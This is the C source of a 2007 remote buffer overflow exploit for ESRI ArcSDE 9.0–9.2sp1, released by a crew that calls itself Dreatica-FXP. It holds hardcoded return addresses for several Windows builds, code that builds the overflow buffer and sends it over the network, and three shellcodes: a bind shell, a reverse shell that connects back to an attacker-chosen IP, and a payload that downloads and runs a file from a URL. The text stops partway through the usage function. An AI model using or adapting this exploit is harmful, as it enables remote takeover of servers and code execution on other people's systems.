/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : ESRI ArcSDE 9.0 - 9.2sp1 
* Site           : http://www.esri.com
* Found by       : iDefense, 
http://labs.idefense.com/intelligence/vulnerabilities/
* ----------------------------------------
* Exploit        : ESRI ArcSDE 9.0 - 9.2sp1 Remote Buffer Overflow 
exploit
* Exploit date   : 26.06.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info           :   Trivially exploitable stack overflow vulnerability: 
if we send more than 516 bytes to 
*                  server, we can overwrite EIP. After the EIP gets 
overwritten we can see that the ESP 
*                  points to the next bytes of buffer after EIP, so we 
simply write shellcode at 520 byte.
*                  The server allows any type of buffer even with the 
0x00 bytes, so have fun!
*                  For use universal RET's you need to find the ArcSDE 
version (this is not a trivial job :P) 
*
*                    Seems that the earlier versions are also 
vulnerable. To protect the server against that
*                  vulnerability you need to install ArcSDE 9.2sp2.
* ----------------------------------------
* Compiling      :
*  To compile this exploit you need:
*    1. Windows C/C++ compiler   
*    2. WinSock 2
* ----------------------------------------
* Thanks to      :
*       1. iDefense                    ( 
http://labs.idefense.com/intelligence/vulnerabilities/ )
*       2. The Metasploit project      ( http://metasploit.com                                  
) 
*       3. ALPHA 2: Zero-tolerance     ( <skylined [at] edup.tudelft.nl>                        
) 
*       4. anghell at Dreatica-FXP     (                                                        
)
*       5. Dreatica-FXP crew           ( http://www.dreatica.cl                                 
)
* ----------------------------------------
* This exploit was written for educational purpose only. Use it at your 
own risk. Author will be not be 
* responsible for any damage, caused by that code.
************************************************************************************
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ctime>
#pragma comment(lib,"ws2_32")


void usage(char * s);
void logo();
void end_logo();
void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int 
cbport, char * url);
void make_buffer(unsigned char * buf, unsigned int * len, int itarget, 
int sh, char * cbip, int cbport, char * url);
int get_version(char * remotehost, int port);
int send_buffer(unsigned char * buf, unsigned int len, char * 
remotehost, int port);
SOCKET do_connect (char *remotehost, int port);
SOCKET do_connect_async (char *remotehost, int port);
int alphanumeric_encoder_thx_to_skylined(char *to_encode, char *encoded 
);

static long timeout = 2000 ; // 2 sec


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------



struct _target{
	const char *t ;
	unsigned long ret ;	
} targets[]=
		{
			{"UNIV: AcrSDE 9.0 [sdesqlsrvr90.dll] ( MSSQL 
)",  0x1015c357 },// jmp esp
			{"UNIV: AcrSDE 9.1 [sdesqlsrvr91.dll] ( MSSQL 
)",  0x1015e3e7 },// jmp esp
			{"UNIV: AcrSDE 9.2 [sdesqlsrvr92.dll] ( MSSQL 
)",  0x1008d742 },// jmp esp			
			{"Windows XP   SP0 RUSSIAN [shell32.dll]",         
0x77a96758 },// jmp esp
			{"Windows XP   SP1 RUSSIAN [advapi32.dll]",        
0x77e1d9d3 },// jmp esp
			{"Windows XP   SP2 RUSSIAN [shell32.dll]",         
0x7d16817f },// jmp esp
			{"Windows XP   SP2 ENGLISH [ole32.dll]",           
0x77548952 },// jmp esp
			{"Windows XP   SP2 DUTCH   [ntdll.dll]",           
0x7c941eed },// jmp esp
			{"Windows 2003 SP0 ENGLISH [shell32.dll]",         
0x77add723 },// jmp esp
			{"Debug / DoS",                                    
0x42424242 },
			{NULL,										       
0x00000000 }
		};


struct {
	const char * name;
	int length;
	char * shellcode;	
}shellcodes[]={ 	
	 {"Bindshell, port 4444   [ args: none ]", 696, 
		 /* win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 
Encoder=Alpha2 http://metasploit.com */
		
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x37\x49\x49\x49"
		
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x42"
		
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x52\x42\x32\x42\x41\x32"
		
"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x6a\x49\x4b\x4c\x62"
		
"\x4a\x68\x6b\x30\x4d\x59\x78\x49\x69\x4b\x4f\x79\x6f\x69\x6f\x71"
		
"\x70\x4e\x6b\x32\x4c\x51\x34\x64\x64\x6e\x6b\x41\x55\x77\x4c\x4c"
		
"\x4b\x71\x6c\x35\x55\x64\x38\x54\x41\x58\x6f\x4c\x4b\x30\x4f\x47"
		
"\x68\x4e\x6b\x53\x6f\x47\x50\x74\x41\x58\x6b\x70\x49\x4c\x4b\x35"
		
"\x64\x6c\x4b\x36\x61\x68\x6e\x57\x41\x79\x50\x6f\x69\x4c\x6c\x6c"
		
"\x44\x4b\x70\x63\x44\x43\x37\x5a\x61\x78\x4a\x44\x4d\x36\x61\x6a"
		
"\x62\x38\x6b\x78\x74\x77\x4b\x51\x44\x74\x64\x76\x48\x51\x65\x4a"
		
"\x45\x4e\x6b\x73\x6f\x61\x34\x55\x51\x5a\x4b\x71\x76\x6c\x4b\x64"
		
"\x4c\x72\x6b\x4e\x6b\x63\x6f\x57\x6c\x75\x51\x7a\x4b\x33\x33\x34"
		
"\x6c\x6c\x4b\x6e\x69\x72\x4c\x45\x74\x45\x4c\x30\x61\x4f\x33\x50"
		
"\x31\x69\x4b\x61\x74\x6c\x4b\x57\x33\x66\x50\x4e\x6b\x43\x70\x64"
		
"\x4c\x6e\x6b\x32\x50\x65\x4c\x6e\x4d\x6e\x6b\x77\x30\x67\x78\x31"
		
"\x4e\x33\x58\x6c\x4e\x30\x4e\x34\x4e\x5a\x4c\x50\x50\x4b\x4f\x69"
		
"\x46\x72\x46\x62\x73\x70\x66\x35\x38\x57\x43\x35\x62\x45\x38\x30"
		
"\x77\x63\x43\x44\x72\x71\x4f\x71\x44\x79\x6f\x4a\x70\x73\x58\x78"
		
"\x4b\x48\x6d\x4b\x4c\x77\x4b\x56\x30\x79\x6f\x7a\x76\x51\x4f\x6f"
		
"\x79\x79\x75\x32\x46\x4b\x31\x48\x6d\x43\x38\x45\x52\x70\x55\x73"
		
"\x5a\x33\x32\x6b\x4f\x4a\x70\x72\x48\x69\x49\x36\x69\x4c\x35\x6e"
		
"\x4d\x50\x57\x4b\x4f\x6a\x76\x36\x33\x36\x33\x61\x43\x33\x63\x62"
		
"\x73\x43\x73\x36\x33\x50\x43\x63\x63\x4b\x4f\x68\x50\x43\x56\x71"
		
"\x78\x62\x31\x51\x4c\x30\x66\x30\x53\x6b\x39\x78\x61\x4c\x55\x65"
		
"\x38\x4e\x44\x67\x6a\x74\x30\x6f\x37\x70\x57\x69\x6f\x6e\x36\x32"
		
"\x4a\x36\x70\x43\x61\x32\x75\x79\x6f\x4e\x30\x50\x68\x4f\x54\x6e"
		
"\x4d\x64\x6e\x6d\x39\x52\x77\x79\x6f\x58\x56\x66\x33\x36\x35\x69"
		
"\x6f\x4e\x30\x45\x38\x38\x65\x72\x69\x6b\x36\x77\x39\x33\x67\x79"
		
"\x6f\x6e\x36\x70\x50\x31\x44\x62\x74\x73\x65\x6b\x4f\x58\x50\x6d"
		
"\x43\x50\x68\x4b\x57\x44\x39\x4f\x36\x64\x39\x71\x47\x6b\x4f\x49"
		
"\x46\x63\x65\x6b\x4f\x4a\x70\x71\x76\x50\x6a\x50\x64\x50\x66\x70"
		
"\x68\x50\x63\x52\x4d\x6e\x69\x58\x65\x32\x4a\x46\x30\x63\x69\x45"
		
"\x79\x48\x4c\x4c\x49\x7a\x47\x63\x5a\x70\x44\x4d\x59\x78\x62\x36"
		
"\x51\x39\x50\x38\x73\x4f\x5a\x6b\x4e\x41\x52\x64\x6d\x6b\x4e\x32"
		
"\x62\x36\x4c\x4e\x73\x4c\x4d\x43\x4a\x34\x78\x4c\x6b\x6e\x4b\x6e"
		
"\x4b\x51\x78\x70\x72\x6b\x4e\x4e\x53\x47\x66\x4b\x4f\x32\x55\x50"
		
"\x44\x4b\x4f\x7a\x76\x43\x6b\x70\x57\x62\x72\x46\x31\x66\x31\x32"
		
"\x71\x30\x6a\x35\x51\x33\x61\x32\x71\x33\x65\x53\x61\x4b\x4f\x5a"
		
"\x70\x30\x68\x6e\x4d\x6e\x39\x73\x35\x7a\x6e\x62\x73\x4b\x4f\x48"
		
"\x56\x63\x5a\x6b\x4f\x59\x6f\x57\x47\x39\x6f\x6e\x30\x4e\x6b\x30"
		
"\x57\x59\x6c\x4b\x33\x38\x44\x45\x34\x59\x6f\x39\x46\x50\x52\x39"
		
"\x6f\x58\x50\x65\x38\x38\x70\x6e\x6a\x37\x74\x53\x6f\x31\x43\x6b"
		"\x4f\x6a\x76\x6b\x4f\x78\x50\x42"
	 },

	  
	 {"ReverseShell           [ args: -I <ip> -P <port> ]", 316,
		
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\xC2\xE2\xFA"
		"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
		
"\x2B\x39\xC2\xC2\xC2\x9D\xA6\x63\xF2\xC2\xC2\xC2\x49\x82\xCE\x49"
		
"\xB2\xDE\x6F\x49\xAA\xCA\x49\x35\xA8\xC6\x9B\x2A\x59\xC2\xC2\xC2"
		
"\x20\x3B\xAA\xF1\xF0\xC2\xC2\xAA\xB5\xB1\xF0\x9D\x96\x3D\xD4\x49"
		
"\x2A\xA8\xC6\x9B\x2A\x40\xC2\xC2\xC2\x20\x3B\x43\x2E\x52\xC3\xC2"
		
"\xC2\x96\xAA\xC3\xC3\xC2\xC2\x3D\x94\xD2\x92\x92\x92\x92\x82\x92"
		
"\x82\x92\x3D\x94\xD6\x49\x1A\xAA\xBD\xC2\xC2\xC3\xAA\xC0\xC2\xC2"
		
"\xF7\x49\x0E\xA8\xD2\x93\x91\x3D\x94\xDA\x47\x02\xB7\x88\xAA\xA1"
		
"\xAF\xA6\xC2\x4B\xA4\xF2\x41\x2E\x96\x4F\xFE\xE6\xA8\xD7\x9B\x69"
		
"\x20\x3F\x04\x86\xE6\xD2\x86\x3C\x86\xE6\xFF\x4B\x9E\xE6\x8A\x4B"
		
"\x9E\xE6\x8E\x4B\x9E\xE6\x92\x4F\x86\xE6\xD2\x96\x92\x93\x93\x93"
		
"\xA8\xC3\x93\x93\x3D\xB4\xF2\x93\x3D\x94\xC6\x49\x0E\xA8\x3D\x3D"
		
"\xF3\x3D\x94\xCA\x91\x3D\x94\xDE\x3D\x94\xCE\x93\x94\x49\x87\xFE"
		
"\x49\x96\xEA\xBA\xC1\x17\x90\x49\xB0\xE2\xC1\x37\xF1\x0B\x8B\x83"
		
"\x6F\xC1\x07\xF1\x19\xCD\x7C\xD2\xF8\x14\xB6\xCA\x03\x09\xCF\xC1"
		
"\x18\x82\x29\x33\xF9\xDD\xB7\x25\x98\x49\x98\xE6\xC1\x1F\xA4\x49"
		
"\xCE\x89\x49\x98\xDE\xC1\x1F\x49\xC6\x49\xC1\x07\x69\x9C\x9B\x01"
		
"\x2A\xC2\x3D\x3D\x3D\x4C\x8C\xCC\x2E\xB0\x3C\x71\xD4\x6F\x1B\xC7"
		
"\x0C\xBC\x1A\x20\xB1\x09\x2F\x3E\xF9\x1B\xCB\x37\x6F\x2E\x3B\x68"
		"\xA2\x25\xBB\x04\xBB"
	},
	 {"Download and execute   [ args: -u <URL> ]", 729,
		/* win32_download_exec - http://metasploit.com */
		/* encoded by "ALPHA 2: Zero-tolerance. 
<skylined@edup.tudelft.nl> */
		
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
		
"\x49\x37\x51\x5A\x6A\x41\x58\x50\x30\x41\x30\x41\x6B\x41\x41\x51"
		
"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
		
"\x75\x4A\x49\x58\x6B\x36\x70\x71\x4A\x33\x7A\x76\x53\x59\x59\x71"
		
"\x76\x38\x39\x57\x4C\x35\x51\x6B\x30\x74\x74\x74\x4A\x6E\x79\x39"
		
"\x72\x7A\x5A\x78\x6B\x36\x65\x4D\x38\x7A\x4B\x4B\x4F\x4B\x4F\x4B"
		
"\x4F\x54\x30\x50\x4C\x4E\x79\x6C\x59\x5A\x39\x4F\x33\x79\x6D\x55"
		
"\x68\x6C\x69\x5A\x39\x4E\x79\x4A\x39\x34\x52\x58\x59\x6E\x75\x54"
		
"\x52\x4B\x59\x6D\x55\x36\x54\x45\x42\x7A\x79\x6F\x61\x56\x72\x53"
		
"\x71\x34\x52\x5A\x4A\x6D\x75\x76\x72\x4A\x4D\x4E\x67\x4D\x31\x6F"
		
"\x6A\x72\x4A\x36\x72\x6B\x57\x4E\x59\x4F\x6A\x33\x52\x76\x72\x6E"
		
"\x37\x4C\x4D\x6F\x5A\x74\x34\x7A\x6F\x48\x4E\x79\x58\x55\x42\x4D"
		
"\x76\x4C\x5A\x73\x52\x74\x52\x32\x4B\x6B\x43\x4C\x57\x49\x50\x52"
		
"\x4A\x75\x6F\x7A\x4D\x4A\x31\x69\x50\x59\x56\x54\x5A\x51\x4E\x4F"
		
"\x6D\x69\x4C\x33\x4B\x64\x30\x4B\x70\x6F\x36\x6B\x77\x54\x52\x73"
		
"\x64\x62\x32\x79\x4F\x4D\x6D\x6E\x7A\x70\x5A\x73\x78\x70\x78\x4F"
		
"\x6A\x62\x78\x6D\x7A\x50\x50\x4B\x4F\x75\x42\x4A\x31\x75\x42\x4B"
		
"\x6F\x6F\x75\x4D\x4A\x61\x4A\x52\x78\x52\x58\x4D\x4B\x6E\x7A\x50"
		
"\x58\x66\x72\x4D\x49\x6D\x4A\x51\x4A\x56\x72\x55\x33\x62\x32\x50"
		
"\x6E\x55\x4A\x51\x4F\x4E\x77\x75\x42\x63\x79\x49\x63\x4D\x4D\x39"
		
"\x50\x32\x51\x4B\x79\x4D\x49\x6D\x49\x6E\x79\x76\x7A\x51\x4F\x4C"
		
"\x54\x68\x4B\x78\x4F\x71\x76\x6A\x6E\x55\x35\x59\x53\x77\x62\x53"
		
"\x71\x4B\x43\x4E\x78\x39\x50\x31\x61\x59\x34\x4D\x49\x4C\x59\x6E"
		
"\x79\x46\x7A\x71\x4F\x6F\x7A\x6A\x6F\x69\x4F\x74\x59\x4D\x77\x77"
		
"\x69\x78\x6C\x73\x53\x37\x69\x6E\x4F\x37\x69\x7A\x67\x75\x4A\x73"
		
"\x45\x6E\x59\x75\x42\x71\x55\x6B\x43\x78\x39\x4B\x7A\x45\x36\x68"
		
"\x4E\x73\x45\x31\x4E\x6D\x4D\x4F\x6A\x39\x55\x79\x68\x6E\x57\x4B"
		
"\x4C\x51\x4E\x6B\x6D\x4F\x6A\x4D\x4D\x38\x61\x79\x6C\x6C\x59\x6A"
		
"\x39\x4F\x5A\x70\x59\x4B\x79\x79\x59\x6A\x6A\x4A\x6F\x39\x59\x73"
		
"\x56\x48\x4E\x53\x55\x55\x42\x71\x55\x6B\x79\x6A\x6A\x50\x66\x48"
		
"\x4E\x65\x39\x6A\x69\x65\x36\x78\x4E\x50\x6D\x6F\x5A\x52\x79\x30"
		
"\x35\x35\x4C\x50\x59\x4A\x4C\x31\x70\x58\x48\x78\x4B\x78\x4F\x6A"
		
"\x6A\x52\x46\x50\x4B\x68\x43\x6B\x70\x74\x72\x73\x4B\x70\x77\x4F"
		
"\x5A\x56\x39\x73\x6A\x61\x61\x4D\x6F\x63\x56\x43\x56\x75\x36\x4B"
		
"\x6E\x79\x6C\x7A\x4D\x6F\x39\x78\x6B\x58\x76\x6B\x4A\x78\x58\x4B"
		
"\x4D\x6B\x4D\x5A\x4B\x4B\x4C\x4A\x4A\x7A\x4A\x5A\x39\x59\x4E\x6B"
		
"\x4C\x48\x6D\x5A\x6A\x6B\x50\x4B\x5A\x5A\x4D\x4B\x4C\x4B\x44\x6B"
		
"\x6D\x6C\x30\x4A\x4B\x6B\x4C\x79\x6A\x58\x6D\x59\x66\x5A\x4B\x59"
		
"\x70\x68\x58\x4D\x49\x7A\x6E\x6A\x50\x4C\x37\x4B\x6C\x6D\x31\x6B"
		
"\x4C\x6B\x4A\x6C\x59\x4B\x6C\x6B\x51\x5A\x50\x48\x6D\x4A\x6D\x68"
		
"\x71\x4A\x4B\x79\x6C\x59\x68\x6B\x4D\x4F\x69\x6E\x35\x4B\x46\x6B"
		
"\x48\x4B\x4D\x4E\x35\x78\x70\x6B\x4B\x4A\x4B\x7A\x58\x48\x6B\x4B"
		
"\x50\x4A\x78\x4C\x59\x4A\x4C\x4A\x4B\x6A\x55\x59\x64\x4C\x36\x6B"
		
"\x47\x4E\x79\x68\x4C\x38\x4B\x7A\x75\x4B\x6D\x79\x66\x7A\x4E\x4B"
		
"\x47\x39\x65\x4A\x56\x58\x78\x4B\x4D\x7A\x6D\x4C\x36\x59\x4F\x78"
		"\x70\x7A\x55\x39\x6C\x6E\x38\x6D\x49"
	 },
	{NULL , NULL }
};



int main(int argc, char **argv)
{
	char * remotehost=NULL, * cbip=NULL, *url=NULL;
	char default_remotehost[]="127.0.0.1";
	char default_cbip[]="127.0.0.1";
	char temp1[100], temp2[100];
	int cbport, port, itarget, sh;
	char ss[100];
	SOCKET s;
	char c;	
	int option_index=0;
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	// set defaults
	cbport=4444;
	port=5151;
	itarget=-1;
	sh=0;
	// ------------	
	
	while((c = getopt(argc, argv, "h:p:s:t:I:P:u:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 's':
				sscanf(optarg, "%d", &sh);
				sh--;
				break;
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;
			case 'P':
				sscanf(optarg, "%d", &cbport);
				break;
			case 'I':				
				cbip=optarg;
				break; 
			case 'u':				
				url=optarg;
				break; 
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	if(remotehost == NULL) remotehost=default_remotehost;
	if(cbip       == NULL) cbip=default_cbip;
	if(url        == NULL) url="";
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	sprintf(temp2, "%d", port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Port    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Payload : %s%s# \n", temp2, temp1);	
	if(itarget!=-1)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) 
-1);	
		printf(" #  Target  : %s%s# \n", targets[itarget].t, 
temp1);		
	}else
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen("Please select 
target") -1);	
		printf(" #  Target  : %s%s# \n", "Please select target", 
temp1);
	}
	if(sh==1)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen(cbip) -1);	
		printf(" #  CB IP   : %s%s# \n", cbip, temp1);
		sprintf(temp2, "%d", cbport);
		memset(temp1,0,sizeof(temp1));
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);
		printf(" #  CB port : %s%s# \n", temp2, temp1);
	}
	printf(" # 
------------------------------------------------------------------- # 
\n");
	fflush(stdout);
	printf("   [+] Checking if server is online\n");
	fflush(stdout);
	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		printf("   [-] Server is OFFLINE\n");
		end_logo();
		return 0;
	}
	closesocket(s);
	printf("   [+] Server is ONLINE\n");

	if(itarget==-1)
	{
		itarget = get_version(remotehost, port);
		if(itarget>=0)
		{
			printf("   [+] Target: %s%\n", 
targets[itarget].t);
		}else
		{
			printf("   [-] Please select target\n");
			WSACleanup();
			end_logo();
			return -1;			
		}		
	}
	
	unsigned char buf[10000];
	unsigned int len;
	memset(buf,0,sizeof(buf));
	fflush(stdout);
	make_buffer(buf, &len, itarget, sh, cbip, cbport, url);

	printf("   [+] Attacking buffer constructed\n");

	if(send_buffer(buf, len, remotehost,port)==-1)
	{
		printf("   [-] Cannot exploit server %s\n", remotehost);
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Buffer sent\n");

	if(sh==0)sprintf(ss, "   [+] Connect to %s:%d\n", remotehost, 
4444);
	if(sh==1)sprintf(ss, "   [+] The shell should arrive at 
%s:%d\n", cbip, cbport);
	if(sh==2)sprintf(ss, "   [+] File is downloaded and 
executred\n");
	printf("%s", ss);
	end_logo();
	WSACleanup();
	return 0;
}



SOCKET do_connect (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   SOCKET s;	
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror("[-] gethostbyname() failed");
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host->h_addr;

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       closesocket(s);
       perror("socket() failed");
       return -1;
   }

   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;

	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
   {
       closesocket(s);     
       return -1;
   }
	

   return s;
}

SOCKET do_connect_async (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   SOCKET s;	
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror("[-] gethostbyname() failed");
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host->h_addr;

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       closesocket(s);
       perror("socket() failed");
       return -1;
   }


    unsigned long l = 1;
    if ( ioctlsocket( s, FIONBIO, &l ) != 0 )
    {
		fprintf( stderr, "Failed setting socket to non-blocking 
mode\n" );
		closesocket( s );
		return -1;
    }


   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;   

   if ( connect( s, (sockaddr*) &addr, sizeof( sockaddr ) ) == 
SOCKET_ERROR )
    {
		int error = WSAGetLastError( );
		if ( ( error != WSAEWOULDBLOCK ) && ( error != 
WSAEINPROGRESS ) )
		{
			fprintf( stderr, "Failed connecting to remote 
host, %d\n", error );
			closesocket( s );
			return -1;
		}
    }

   return s;
}






// get arcsde version to determine target
int get_version(char * remotehost, int port)
{
		// ----------------------------------------
    	// removed due to publicity of the exploit
		// ----------------------------------------
	return -1;
}






void prepare_shellcode(unsigned char * fsh, unsigned int * fshlength, 
int sh, char * cbip, int cbport, char *url)
{
	memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
	*fshlength = shellcodes[sh].length;
	if(sh==1)
	{			
		static struct hostent *host = gethostbyname(cbip);
		static struct sockaddr_in addr;
		addr.sin_addr = *(struct in_addr*)host->h_addr;		
		fsh[111] = (addr.sin_addr.S_un.S_un_b.s_b1) ^ 0xc2;
		fsh[112] = (addr.sin_addr.S_un.S_un_b.s_b2) ^ 0xc2;
		fsh[113] = (addr.sin_addr.S_un.S_un_b.s_b3) ^ 0xc2;
		fsh[114] = (addr.sin_addr.S_un.S_un_b.s_b4) ^ 0xc2;
        
		fsh[118] = ((cbport >> 8) & 0xff) ^ 0xc2;
		fsh[119] = ((cbport     ) & 0xff) ^ 0xc2;
	}
	if(sh==2)
	{
		char locurl[1000];
		memset(locurl,0,sizeof(locurl));
		memcpy(locurl, url, strlen(url));
		locurl[strlen(locurl)]='\x80';
		char encoded_url[2500] ;
		alphanumeric_encoder_thx_to_skylined(locurl, 
encoded_url);
		strcat((char *)fsh, encoded_url);	
		*fshlength += (unsigned int)strlen(encoded_url);
	}
}

void make_buffer(unsigned char * buf, unsigned int * len, int itarget, 
int sh, char * cbip, int cbport, char * url)
{
	// prepare shellcode
	unsigned char fsh[10000];	
	unsigned int fshlength;
	memset(fsh, 0, sizeof(fsh));	
	prepare_shellcode(fsh, &fshlength, sh, cbip, cbport, url);
	// -----------------

	// make buffer
	unsigned char * cp=buf;		
		
		// long buffer
	*cp++='\x80';
	memset(cp, '\x41', 515);
	cp+=515;	

		//replace EIP
	*cp++ = (char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 24) & 0xff);	

		// jff
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
    *cp++ = '\x90';

		// copy shellcode
	memcpy(cp, fsh, fshlength);
	cp+=fshlength;
    	
		// set the length manually cause of the 0x00 bytes 
	*len = (unsigned int)(cp-buf);
	// -----------------
}



int send_buffer(unsigned char * buf, unsigned int len, char * 
remotehost, int port)
{	
	SOCKET sock;
	char str[1000];
	int bytes;
	char bufmax[4096];

	sock = do_connect_async(remotehost, port);
	if(sock==-1)
	{
		printf("   [-] Failed to connect to server\n");
	}	
	fd_set  fdConnect  = { 0 };

	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	long dwTimeout=5000;
	if (INFINITE != dwTimeout) 
	{
	    stTime.tv_sec = dwTimeout / 1000;
	    stTime.tv_usec = dwTimeout % 1000;
	    pstTime = &stTime;
	}
	if (!FD_ISSET(sock, &fdConnect))
	FD_SET(sock, &fdConnect);

	int res = select(NULL, NULL, &fdConnect, NULL, pstTime);
    if(res==0)
	{
		closesocket(sock);
		return -1;
	}
	if(res<0)
	{
		closesocket(sock);
		return -1;
	}

	bytes = send(sock, (char *)buf, len, 0);
	Sleep(500);
	printf("   [+] Sent %d bytes to server\n", bytes);
	
	fd_set  active_set, read_set;

	FD_ZERO(&active_set);
    FD_SET(sock, &active_set);

	read_set = active_set;
    res = select(FD_SETSIZE,&read_set,NULL,NULL, pstTime);

	if (res==0)
	{
		closesocket(sock);
		return 1;
	}

	if ( res<0 ) {
    	closesocket(sock);
		return -1;
    }

    for (int i=0; i<FD_SETSIZE; i++) 
	{
        if ( FD_ISSET(i,&read_set) ) 
		{
            if ( i==sock ) 
			{
                if((bytes = recv(sock, bufmax, sizeof(bufmax),0)) == 
-1){
					int error = WSAGetLastError( );
					if ( ( error != WSAEWOULDBLOCK ) 
&& ( error != WSAEINPROGRESS ) )
					{
						closesocket( sock );
						return -1;
					}
					return 1;
				}
            } else {
				closesocket(sock);
				return -1;
			}
		}
	}

	closesocket(sock);
	return 1;
}

// alphanumeric encoder took from "ALPHA 2: Zero-tolerance." code
int alphanumeric_encoder_thx_to_skylined(char *to_encode, char *encoded 
)
{
  int   i,ii=0, input, A, B, C, D, E, F, length=(int)strlen(to_encode);
  char* valid_chars = 
"0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; // 
mixed chars
  char temp[10];
  memset(temp, 0 , sizeof(temp));
  memset(encoded,0x00,1000);  
  srand((int)clock());  
  while( (input = to_encode[ii++]) != 0 ) {
    A = (input & 0xf0) >> 4;
    B = (input & 0x0f);
    F = B;
    i = rand() % ((int)strlen(valid_chars));
    while ((valid_chars[i] & 0x0f) != F) { i = ++i % 
((int)strlen(valid_chars)); }
    E = valid_chars[i] >> 4;
    D = (A^E);
    i = rand() % ((int)strlen(valid_chars));
    while ((valid_chars[i] & 0x0f) != D) { i = ++i % 
((int)strlen(valid_chars)); }
    C = valid_chars[i] >> 4;
    sprintf(temp,"%c%c", (C<<4)+D, (E<<4)+F);
    encoded[strlen(encoded)]=temp[0];
	encoded[strlen(encoded)]=temp[1];
  }
  encoded[strlen(encoded)]='A';
  return 0;
}




// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || 
argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------


void usage(char * s)
{	
	printf("   Usage : %s -h <host> -p <port> -s <payload> -t 
<target> -I <IP> -P <port> -u <url>\n", s);
	printf("   Arguments:\n");
	printf("      -h <host>     host to connect\n");
	printf("      -p <port>     port (default: 5151)\n");
	printf("      -s <payload>  select shellcode (default: 1)\n");
	printf("      -t <target>   target to attack\n");
	printf("      -I <IP>       reverse IP for the connect-back 
shellcode\n");
	printf("      -P <port>     reverse port for the connect-back 
shellcode\n");
	printf("      -u <url>      url for executable for DAX 
shellcode\n\n");
	printf("    Shellcodes:\n");
	for(int i=0; shellcodes[i].name!=0;i++)
	{
		printf("       %d. %s\n",i+1,shellcodes[i].name);				
	}	
	printf("\n");
	printf("    Targets:\n");
